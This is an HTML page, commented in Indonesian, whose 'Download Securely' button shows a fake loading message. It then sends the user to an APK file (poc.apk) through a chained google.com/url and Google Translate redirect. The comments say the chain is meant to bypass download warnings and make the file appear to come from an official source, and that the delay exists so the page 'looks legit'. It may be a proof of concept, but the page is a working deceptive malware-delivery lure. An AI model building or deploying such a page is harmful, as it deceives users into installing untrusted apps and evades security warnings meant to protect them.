<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 8px;
    }
    .loading {
      display: none; /* Muncul saat loading */
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <center>
    <h2>Klik untuk download dari situs resmi via Google Translate</h2>
    <button class="button" onclick="initiateSafeDownload()">Download Securely</button>
    <p id="loadingMsg" class="loading">Memproses via Google... Harap tunggu (2 detik).</p>
  </center>

  <script>
    function initiateSafeDownload() {
      // Tampilkan fake loading untuk natural feel
      document.getElementById('loadingMsg').style.display = 'block';
      
      // APK URL encoded untuk embed di Translate
      const apkUrl = encodeURIComponent('https://aliothme.github.io/poc.apk');
      
      // Double redirect: google.com/url â†’ translate.google.com (bypass warning)
      const translateRedirect = `https://translate.google.com/translate?sl=en&tl=id&u=${apkUrl}&op=translate`;
      
      // Chain dengan google.com/url untuk extra layer (masih work jika APK dianggap "doc")
      const googleChain = encodeURIComponent(translateRedirect);
      const finalUrl = `https://www.google.com/url?sa=t&url=${googleChain}`;
      
      setTimeout(() => {
        // Buka di tab baru (hindari popup block)
        window.open(finalUrl, '_blank');
        // Atau: window.location.href = finalUrl; untuk same tab
      }, 2000);  // Delay 2 detik agar loading terlihat legit
    }
  </script>
</body>
</html>
